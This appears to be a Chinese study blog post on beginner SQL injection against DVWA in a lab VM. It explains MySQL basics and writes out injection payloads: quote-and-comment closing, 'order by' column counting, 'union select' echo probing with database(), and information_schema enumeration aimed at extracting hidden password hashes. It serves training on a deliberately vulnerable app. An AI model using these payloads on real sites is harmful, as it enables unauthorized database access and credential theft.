---
layout: post
title: DVWA注入入门从order by到union
date: "2026-11-16 22:30:00 +0800"
categories: [课外拓展, MySQL, Web安全]
tags: [mysql, dvwa, sql-injection]
---

## 一、学习环境

- 靶场：OWASP Broken Web Apps v1.2，DVWA v1.8，安全等级low
- 数据库：MySQL 5.1.41
- 登录方式：SSH进虚拟机后执行mysql -u root -p
- 页面地址：http://192.168.216.129/dvwa/vulnerabilities/sqli/

## 二、先认识名词

| 名词 | 一句话定义 | 例子 |
|---|---|---|
| 表 | 存同类数据的地方，有列有行 | users表 |
| 列 | 表里的一类属性，也叫字段 | user_id、password |
| 行 | 表里的一条完整记录 | admin那一行 |
| 主键 | 能唯一标识一行的列 | user_id |
| 数据类型 | 这一列存什么形态的值 | int存数字，varchar存文本 |
| 哈希 | 把密码变成固定长度字符，不可逆 | 21232f297a57… |
| 元数据 | 描述数据的数据，比如“有哪些表” | information_schema |
| schema | 库的另一个叫法 | dvwa就是一个schema |
| desc | 句首是“看表结构”，order by里是“降序” | desc users; |

## 三、先看表结构

```sql
desc users;
```

输出六列：

| 列 | 类型 | 说明 |
|---|---|---|
| user_id | int(6) | 编号，主键 |
| first_name | varchar(15) | 名 |
| last_name | varchar(15) | 姓 |
| user | varchar(15) | 登录名 |
| password | varchar(32) | 密码哈希 |
| avatar | varchar(70) | 头像路径 |

再看数据：

```sql
select * from users;
```

六条记录，admin的user_id是1，password是32位哈希。

这两步的作用：知道有哪些列、每列什么类型、哪些列是页面不显示的。DVWA页面上的查询只取了first_name和last_name两列，user和password被藏起来了，注入的目的就是把它们弄出来。

## 四、在DVWA上数列数

后端查询是：

```sql
select first_name, last_name from users where user_id = '$id'
```

字符型，引号包裹。先闭合加注释：

```
1' #
```

实际执行：

```sql
select first_name, last_name from users where user_id = '1' #'
```

数据恢复正常，First name和Surname都是admin。

然后数列数，输入：

```
1' order by 1 #
1' order by 2 #
1' order by 3 #
```

前两条正常，第三条报错，说明查询只有2列。

为什么用order by：它后面的数字表示“按第几列排序”，超过列数会报`Unknown column '3' in 'order clause'`，用报错位置反推列数。

## 五、用union确认回显位

输入：

```
1' union select 1,2 #
```

页面出现两行，第二行First name是1，Surname是2。

再输入：

```
1' union select 111,222 #
```

第二行变成111和222。这说明页面显示什么，完全由你写进去的值决定。

把第二个位置换成函数：

```
1' union select 1,database() #
```

第二行变成1和dvwa，库名读出来了。

## 六、踩坑记录

**坑一：from拼成fro**

写`select * fro users;`，报1064，报错信息里的near直接指出`fro users`。关键字拼写错误，重点看near后面的内容。

**坑二：把条件写进了order by**

写`order by user_id > 3`，以为是在筛选。实际是拿一个真假值当排序依据，六行一行没少，只是顺序变了。

条件属于where，排序属于order by，两者不能互换。

**坑三：字符串不加引号**

写`where user = admin`，MySQL把admin当列名去找，报Unknown column。字符串必须加单引号。

**坑四：字符串列和数字比较**

写`where user > 3`，user是varchar，MySQL会把它转成数字：1337转成1337，admin转成0。结果大部分行被排除。

字符串列要和字符串比，数字列才能和数字比。

**坑五：没选库就查表**

直接`select * from users`报1046 No database selected，先`use dvwa;`才能查。

## 七、information_schema是什么

MySQL装好时会自带一个只读的库叫information_schema，里面记录服务器上所有库、表、列的信息。建表时MySQL自动登记，删表时条目一起消失。

查dvwa有哪些表：

```sql
select table_name from information_schema.tables where table_schema = 'dvwa';
```

预期两行：guestbook、users。

为什么注入必须用它：网页参数只能让你的输入成为原语句的一部分，`show tables`这种独立命令执行不了，只有select能接在union后面。而结构信息正好能用select从information_schema里查出来。

## 八、还没解决的点

table_schema这一列的含义还没吃透。知道它是tables表里的一列，值是库名，但为什么条件写它、和database()有什么区别还不清楚。

## 九、总结

1、desc看结构，select看数据，动手注入前先把这两样做一遍，知道表里有什么、页面漏了什么。
2、order by的数字是列序号，超过列数会报错，用它数列数不依赖页面显示。
3、union把自定义查询的结果接到原结果后面，列数必须一致。
4、页面显示什么由你写的值决定，写1显示1，写database()显示库名。
5、网页参数里只能执行select，查结构只能靠information_schema。
